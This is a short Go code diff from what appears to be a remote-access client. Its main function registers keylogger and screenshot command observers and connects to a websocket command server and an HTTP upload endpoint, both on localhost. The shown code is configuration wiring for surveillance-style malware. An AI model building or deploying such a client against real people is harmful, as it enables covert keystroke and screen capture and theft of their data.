@@ -23,9 +23,17 @@ func main() {
 	subject.AddListener(observer.NewKeyloggerCmdObserver())
 	subject.AddListener(observer.NewScreenshotCmdObserver(screenrecorder))
 
+	// ===========================================================================
 	// Start connection and communication with server
 	// Subject with Observers is passed as parameter
 	// for processing commands
-	wsclient.StartCommunications(subject)
+	// ===========================================================================
+	// Creates WSClient configurations
+	wscconf := wsclient.NewWSConfiguration("ws", "localhost", "8080", "/accesspoint")
+	httpconf := wsclient.NewHTTPConfiguration("http", "localhost", "80", "/upload")
+
+	// Creates WSClient
+	wsc := wsclient.NewWSClient(wscconf, httpconf)
+	wsc.StartCommunications(subject)
 
 }
